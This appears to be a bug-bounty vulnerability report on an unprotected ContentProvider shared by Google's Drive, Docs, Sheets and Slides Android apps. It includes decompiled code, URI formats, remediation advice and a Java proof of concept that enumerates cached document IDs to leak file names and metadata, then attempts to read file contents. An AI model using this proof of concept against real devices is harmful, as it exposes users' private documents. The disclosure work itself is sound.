# VRP Report #35: Google Workspace LegacyStorageBackendContentProvider Permission Bypass

## Vulnerability Summary

The entire Google Workspace mobile suite — Google Drive, Google Docs, Google Sheets, and Google Slides — all expose a shared `LegacyStorageBackendContentProvider` ContentProvider that is **exported without any manifest-level permissions**. The `query()` method has **no permission validation at all**, allowing any installed app to read metadata about locally cached documents (file names, document IDs, sizes, MIME types, modification dates). The `openFile()`, `openTypedAssetFile()`, and `call()` methods have permission checks gated behind a Phenotype feature flag — when disabled, any app can **read and write actual file contents** of locally cached documents.

This vulnerability affects **all four Google Workspace editor apps** sharing the same vulnerable codebase in the `com.google.android.apps.docs.common.storagebackend` package.

## Affected Components

| App | Package | Authority | Exported | Permissions |
|-----|---------|-----------|----------|-------------|
| Google Drive | `com.google.android.apps.docs` | `com.google.android.apps.docs.storage.legacy` | `true` | NONE |
| Google Docs | `com.google.android.apps.docs.editors.kix` | `com.google.android.apps.docs.editors.kix.storage.legacy` | `true` | NONE |
| Google Sheets | `com.google.android.apps.docs.editors.sheets` | `com.google.android.apps.docs.editors.trix.storage.legacy` | `true` | NONE |
| Google Slides | `com.google.android.apps.docs.editors.slides` | `com.google.android.apps.docs.editors.punch.storage.legacy` | `true` | NONE |

**Class**: `com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider`

## Technical Details

### Finding 1: Unconditional Metadata Leak via `query()` (CONFIRMED)

The `query()` method at line 402 of `LegacyStorageBackendContentProvider.java` performs NO caller validation:

```java
@Override
public final Cursor query(Uri uri, String[] strArr, ...) {
    uri.getClass();
    int iMatch = this.a.match(uri);       // URI pattern match only
    if (iMatch != 1) return null;
    if (strArr == null) strArr = mry.b();  // default projection
    msj msjVarD = ((lex) ((nno) c()).a).d(uri);
    if (msjVarD == null) return null;
    return msjVarD.b(strArr, msd.b);       // returns data directly
```

No calls to `getCallingPackage()`, `checkCallingUriPermission()`, `Binder.getCallingUid()`, or any other access control. Any app can query this provider.

**Exposed columns** (from `mry.java` static initializer):
- `_display_name` — **document title/filename** (e.g., "Medical Records.docx", "Tax Return 2025.xlsx")
- `document_id` — Drive document identifier
- `_size` — file size in bytes
- `mime_type` — document type
- `last_modified` — modification timestamp
- `flags` — document flags
- `content_sync_state_flags` — sync state

### Finding 2: Feature-Flag-Gated Permission Bypass in `openFile()` / `call()` (CONDITIONAL)

The `openFile()` method at line 164 has a conditional permission check:

```java
@Override
public final ParcelFileDescriptor openFile(Uri uri, String str) throws IOException {
    if (((ahiq) ((adhb) ahip.a.b).a).a()) {  // Feature flag check
        d(uri, i);  // URI permission check — only runs IF flag is true
    }
    // ... proceeds to open file without any other checks
```

The `d()` method (line 67) calls `checkCallingUriPermission()`. But this entire check is conditional on the Phenotype feature flag `ahip.a.b` / `ahiq.a()`. When the flag returns `false`, **no permission check occurs** and any app can:
- **Read** locally cached Drive/Docs files via `openFile(uri, "r")`
- **Write** to locally cached Drive files via `openFile(uri, "w")`
- **Read** typed assets via `openTypedAssetFile()`
- **Execute call()** operations on documents

The same pattern affects `openTypedAssetFile()` (line 370) and `call()` (line 94).

## URI Format

The provider accepts URIs in the format:
- `content://<authority>/<path_segment>?local_id=<id>`
- `content://<authority>/enc=<account_id>:<doc_spec>`

Where:
- `local_id` maps to a local document cache entry
- `enc=<account_id>` identifies the Google account

## Impact

### Confidentiality (HIGH):
- **Document title leak**: File/document names can reveal sensitive information (project names, personal records, financial documents)
- **Metadata leak**: File sizes, types, and modification dates reveal user activity patterns
- **File content access**: When the feature flag is disabled, actual document contents are readable

### Integrity (MEDIUM):
- When the feature flag is disabled, `openFile()` in write mode allows modification of cached documents

## Affected Devices

All Android devices with Google Drive and/or Google Docs installed. Tested build: CP2A.260605.012 (Android 17, Pixel 6a).

## Proof of Concept

```java
// PoC: Query metadata from Drive's LegacyStorageBackendContentProvider
// No permissions needed — provider is exported with no protection
ContentResolver cr = getContentResolver();

// Query with local_id (try sequential IDs for enumeration)
for (int id = 0; id < 100; id++) {
    Uri uri = Uri.parse("content://com.google.android.apps.docs.storage.legacy/doc?local_id=" + id);
    Cursor c = cr.query(uri, 
        new String[]{"_display_name", "document_id", "_size", "mime_type", "last_modified"},
        null, null, null);
    if (c != null && c.moveToFirst()) {
        String name = c.getString(0);      // Document name
        String docId = c.getString(1);     // Drive document ID
        long size = c.getLong(2);          // File size
        String mime = c.getString(3);      // MIME type
        long modified = c.getLong(4);      // Last modified
        Log.d("VRP", "LEAKED: " + name + " (id=" + docId + ", " + size + " bytes, " + mime + ")");
    }
    if (c != null) c.close();
}

// Attempt to read file content (works if feature flag is disabled)
Uri fileUri = Uri.parse("content://com.google.android.apps.docs.storage.legacy/doc?local_id=1");
try {
    ParcelFileDescriptor pfd = cr.openFileDescriptor(fileUri, "r");
    if (pfd != null) {
        InputStream is = new FileInputStream(pfd.getFileDescriptor());
        byte[] buf = new byte[1024];
        int read = is.read(buf);
        Log.d("VRP", "READ " + read + " bytes of document content!");
        is.close();
        pfd.close();
    }
} catch (Exception e) {
    Log.d("VRP", "openFile blocked (feature flag may be enabled): " + e.getMessage());
}
```

## Remediation Recommendations

1. Add `android:readPermission` and `android:writePermission` to the provider declaration
2. Remove the feature flag gating on permission checks — always enforce `checkCallingUriPermission()`
3. Add caller validation in `query()` (e.g., check calling package or UID)
4. Consider making the provider `exported=false` if cross-app access is not required

## References

- CVE-2019-2096 (ContentProvider permission bypass precedent)
- Google VRP guidelines for data access without authorization
